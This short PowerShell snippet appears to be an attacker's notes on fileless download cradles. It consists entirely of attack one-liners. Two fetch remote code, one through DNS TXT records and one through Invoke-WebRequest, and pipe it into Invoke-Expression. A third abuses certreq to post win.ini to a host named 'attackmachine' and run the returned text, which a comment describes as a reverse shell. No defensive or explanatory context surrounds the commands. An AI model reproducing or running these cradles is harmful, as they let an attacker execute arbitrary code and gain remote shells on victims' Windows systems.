Powershell:

##Ok (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
##Ok iwr http://domain_oneline.txt | iex

#### no implemented Request a Certificate buty insted open win.ini and apply revershell from web request
((certreq -Post -config "https://attackmachine/revshell" "c:\windows\win.ini")-join"`n"-split'#') | select -skip 1 -f 1).Trim() | iex



